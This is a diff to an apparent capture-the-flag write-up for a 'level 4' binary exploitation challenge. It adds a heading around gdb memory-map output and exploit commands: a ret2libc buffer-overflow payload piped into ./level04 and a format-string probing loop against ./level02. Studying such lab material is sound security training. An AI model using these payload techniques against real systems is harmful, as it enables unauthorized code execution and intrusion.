@@ -1,3 +1,7 @@
+<h1 align="center"> LEVEL 4 </h1>
+
+## 🔍 Analysis of Decompiled [level4]
+```
 (gdb) info proc map
 process 1869
 Mapped address spaces:
@@ -38,3 +42,5 @@ PAYLOAD:
 (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "EXIT"+ "\xec\x97\xf8\xf7"';cat)| ./level04
 
 for(( i = 1; i < 40; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+
+```
